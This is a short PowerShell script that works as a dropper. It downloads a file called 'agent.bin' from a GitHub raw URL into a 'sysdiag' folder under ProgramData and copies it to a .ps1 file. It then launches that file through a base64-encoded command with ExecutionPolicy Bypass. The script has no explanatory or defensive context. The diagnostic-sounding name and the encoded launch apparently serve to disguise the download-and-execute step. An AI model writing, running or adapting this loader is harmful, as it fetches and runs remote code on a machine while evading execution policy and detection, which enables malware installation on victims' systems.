Start-Sleep 3
$dropUrl = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/agent.bin"
$destPath = "C:\ProgramData\sysdiag\agent.bin"
$execPath = "C:\ProgramData\sysdiag\agent.ps1"

# Ensure the sysdiag directory exists
$folder = Split-Path $destPath
if (-not (Test-Path $folder)) {
    New-Item -Path $folder -ItemType Directory | Out-Null
}

Invoke-WebRequest -Uri $dropUrl -OutFile $destPath

Copy-Item -Path $destPath -Destination $execPath

# Prepare base64 command to execute the .ps1 file
$cmd = "powershell -ExecutionPolicy Bypass -File `"$execPath`""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Run encoded command
powershell.exe -EncodedCommand $encodedCommand
